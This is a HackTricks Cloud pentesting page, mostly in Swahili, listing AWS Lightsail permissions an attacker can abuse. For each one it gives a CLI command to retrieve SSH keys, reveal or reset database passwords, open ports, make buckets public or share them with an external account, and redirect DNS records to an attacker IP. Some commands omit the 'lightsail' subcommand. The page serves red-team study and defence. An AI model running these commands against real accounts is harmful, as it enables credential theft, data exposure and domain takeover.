# AWS - Lightsail Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lightsail

Kwa maelezo zaidi kuhusu Lightsail angalia:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Ni muhimu kutambua kwamba Lightsail **haitumii majukumu ya IAM yanayomilikiwa na mtumiaji** bali kwa akaunti inayosimamiwa na AWS, hivyo huwezi kutumia huduma hii kwa privesc. Hata hivyo, **data nyeti** kama vile msimbo, funguo za API na taarifa za database zinaweza kupatikana katika huduma hii.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Ruhusa hii itakuruhusu kupata funguo za SSH za kufikia mifano:
```
aws lightsail download-default-key-pair
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya mifano.

### `lightsail:GetInstanceAccessDetails`

Ruhusa hii itakuruhusu kuunda funguo za SSH ili kufikia mifano:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya mifano.

### `lightsail:CreateBucketAccessKey`

Ruhusa hii itakuruhusu kupata ufunguo wa kufikia ndoo:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya bucket.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Ruhusa hii itakuruhusu kupata akreditif za kufikia database:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya hifadhidata.

### `lightsail:UpdateRelationalDatabase`

Ruhusa hii itakuruhusu kubadilisha nenosiri la kufikia hifadhidata: 

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Ikiwa database si ya umma, unaweza pia kuifanya kuwa ya umma na ruhusa hizi na

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti ndani ya hifadhidata.

### `lightsail:OpenInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao.
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Madhara Yanayoweza Kutokea:** Upatikanaji wa bandari nyeti.

### `lightsail:PutInstancePublicPorts`

Ruhusa hii inaruhusu kufungua bandari kwa Mtandao. Kumbuka kwamba wito utafungia bandari yoyote iliyofunguliwa ambayo haijatajwa ndani yake.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Madhara Yanayoweza Kutokea:** Upatikanaji wa bandari nyeti.

### `lightsail:SetResourceAccessForBucket`

Ruhusa hii inaruhusu kutoa upatikanaji wa instances kwa bucket bila hati zozote za ziada.

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa uwezekano wa mifuko yenye taarifa nyeti.

### `lightsail:UpdateBucket`

Kwa ruhusa hii, mshambuliaji anaweza kutoa upatikanaji wa kusoma kwa akaunti yake ya AWS juu ya mifuko au hata kufanya mifuko hiyo kuwa ya umma kwa kila mtu:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Madhara Yanayoweza Kutokea:** Upatikanaji mpya wa uwezo wa mifuko yenye taarifa nyeti.

### `lightsail:UpdateContainerService`

Kwa ruhusa hii, mshambuliaji anaweza kutoa ufikiaji kwa ECRs za kibinafsi kutoka kwa huduma za kontena.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Madhara Yanayoweza Kutokea:** Pata taarifa nyeti kutoka ECR ya faragha

### `lightsail:CreateDomainEntry`

Mshambuliaji mwenye ruhusa hii anaweza kuunda subdomain na kuielekeza kwenye anwani yake ya IP (uchukuaji wa subdomain), au kuunda rekodi ya SPF inayomruhusu kudanganya barua pepe kutoka kwenye domain, au hata kuweka domain kuu kwenye anwani yake ya IP.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Madhara Yanayoweza Kutokea:** Kuchukua udhibiti wa kikoa

### `lightsail:UpdateDomainEntry`

Mshambuliaji mwenye ruhusa hii anaweza kuunda subdomain na kuielekeza kwenye anwani yake ya IP (kuchukua subdomain), au kuunda rekodi ya SPF inayomruhusu kutuma barua pepe kwa kutumia kikoa hicho, au hata kuweka kikoa kikuu kwenye anwani yake ya IP.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Madhara Yanayoweza Kutokea:** Kuchukua udhibiti wa domain

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
